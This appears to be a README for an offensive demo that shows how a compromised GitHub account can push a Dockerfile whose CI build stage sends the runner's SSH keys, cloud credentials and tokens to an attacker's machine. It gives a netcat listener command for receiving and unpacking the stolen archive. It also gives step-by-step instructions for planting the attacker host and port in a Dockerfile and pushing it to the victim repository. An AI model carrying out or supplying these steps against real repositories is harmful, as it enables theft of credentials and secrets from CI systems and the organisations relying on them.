# CI Exfiltration

## Overview

This demonstrates how a compromised GitHub account can be abused to exfiltrate sensitive data from a Continuous Integration (CI) environment during the Docker image build stage.

In many CI systems, the build process executes inside a runner where the working directory is often the CI user’s home directory (for example /home/runner or /home/$USER). These directories may contain sensitive material such as:

- SSH keys (~/.ssh)
- Cloud credentials (~/.aws, ~/.config)
- Tokens or environment artifacts
- Cached secrets from previous jobs

Because this activity occurs during image build, it can happen before any pull request review or manual approval, making it a high-impact attack vector when repository access is compromised.

## Attacker Machine Setup
Use netcat to recieve the exfiltrated loot, change `4444` to whatever port you want to use:

```shell
nc -nlvp 4444 > loot.b64 && base64 -d loot.b64 | tar xz
```

## Target Setup

1. In the `Dockerfile` set the arg's where `HOST` and `PORT` is the the attacker machine and port.

2. Push the `Dockerfile` to the compromised repository.

3. Once the CI job runs, the build stage will initiate the exfiltration process.